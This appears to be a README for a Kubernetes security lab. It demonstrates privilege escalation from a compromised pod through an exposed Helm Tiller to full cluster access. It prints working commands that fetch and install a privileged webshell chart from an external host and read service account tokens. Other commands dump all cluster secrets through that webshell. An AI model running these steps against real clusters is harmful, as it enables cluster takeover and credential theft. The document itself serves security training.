# Compromised Container

This scenario demonstrates the potential for privilege escalation and lateral movement as a result of a pod compromise in a Kubernetes cluster with commonly-found configurations leading to full cluster access.

## Demo
[![asciicast](https://asciinema.org/a/F8NCWjE7Akhtcj8ZUePZmiF8E.svg)](https://asciinema.org/a/F8NCWjE7Akhtcj8ZUePZmiF8E)

NOTE: This scenario will run a compromised container with root access, and it set for demo purposes only. We strongly recommend **NOT RUNNING IT ON A LIVE CLUSTER**

## pre-requisites 
Make sure your cluster is setup following the [instructions here](../env/README.md)

## Lets Hack it

### Setup and install the "compromised container"

1. Apply the yaml located the in compromised-container

```console
kubectl apply -f compromised-container/installation.yaml
```
2. Create a local proxy to reach the "exposed" dashboard service:

```console
kubectl port-forward service/dashboard 8080:8080
```
3. Visit the dashboard by opening http://localhost:8080.
4. Navigate to /webshell and provide the basic auth credentials.

### Look for Helm tiller 

1. Download kubectl 
```console 
export PATH=/tmp:$PATH
cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl; chmod +x kubectl
```
2. Look for tiller deployment running in `kube-system` namespace 
```console
curl -v tiller-deploy.kube-system:44134
```
3. Download the Helm client binary 
```console
cd /tmp; curl -so helm.tar.gz https://get.helm.sh/helm-v2.16.1-linux-amd64.tar.gz; tar zxvf helm.tar.gz; chmod +x linux-amd64/helm; cp linux-amd64/helm .
```
4. Run `helm ls` to test access to tiller 
```console 
helm version --host=tiller-deploy.kube-system:44134
export HELM_HOST=tiller-deploy.kube-system:44134; helm ls
```

### Deploy webshell workload with elevated privileges to Kubernetes 
1. install privileged workload via Helm
```console
curl -sLO https://github.com/bgeesaman/nginx-test/archive/v1.0.0.tar.gz
helm install v1.0.0.tar.gz
```
2. Access the webshell with curl and run commands in the privileged pod as cluster-admin to get the newly created pod's service account token

```console
curl -XPOST -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token" nginx-test.default:8080
```
3. Get a list of all secrets in all namespaces
```console
curl -XPOST -d "cmd=kubectl get secrets -A" nginx-test.default:8080
```
4. Get all secrets 
```console
curl -XPOST -d "cmd=kubectl get secrets -A -o yaml" nginx-test.default:8080
```

```console

  ________                        ________                      
 /  _____/_____    _____   ____   \_____  \___  __ ___________  
/   \  ___\__  \  /     \_/ __ \   /   |   \  \/ // __ \_  __ \ 
\    \_\  \/ __ \|  Y Y  \  ___/  /    |    \   /\  ___/|  | \/ 
 \______  (____  /__|_|  /\___  > \_______  /\_/  \___  >__|    
        \/     \/      \/     \/          \/          \/        
```

## Cleanup

To cleanup run 
```console
kubectl delete -f compromised-container/
```